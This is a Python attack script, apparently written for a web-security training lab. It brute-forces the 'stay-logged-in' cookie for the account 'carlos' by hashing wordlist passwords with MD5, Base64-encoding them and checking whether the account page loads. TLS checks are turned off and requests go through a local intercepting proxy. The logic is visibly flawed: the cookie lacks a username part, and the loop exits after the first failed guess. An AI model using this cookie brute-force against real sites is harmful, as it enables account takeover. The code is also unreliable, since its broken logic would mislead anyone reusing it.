import requests
import hashlib
import sys
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def access_carlos_page(s,url):
    print("######### Accessing the carlos page##############")
    # open the password file hai.
    with open('lab_10_password.txt','r') as file:
        password=file.readlines()
        for i in password:
            # now I do get a password what I do it hash into md5 and encode it
            i=i.strip()
            md5_hash_passwd=hashlib.md5(i.encode("utf-8")).hexdigest()
            #print(md5_hash_passwd)
            # now I need to change this passsword into base64
            base64_passwd=base64.b64encode(bytes(md5_hash_passwd,"utf-8"))
            str_passwd=base64_passwd.decode('utf-8')
            print(str_passwd.rstrip("="))
            
            
            # now we need to use it hai ta
            my_account=url+'my-account?id=carlos'
            cookies={'stay-logged-in':str_passwd}
            # make a get request
            r=requests.get(my_account,cookies=cookies,verify=False,proxies=proxies)
            res=r.text
            if "Log out" in res:
                print("Successfully found the carlos page", str_passwd)
                exit(0)
            else:
                print("Failed to found carlos page")
                sys.exit(-1)
                    
            


def main():
    if len(sys.argv)!=2:
        print("Usage %s <url>" % sys.argv[0])
        print("Example %s www.example.com" % sys.argv[0])
    else:
        s=requests.Session()
        url=sys.argv[1]
        print(f"The url is: {url}") 
        access_carlos_page(s,url) 

if __name__=="__main__":
    main()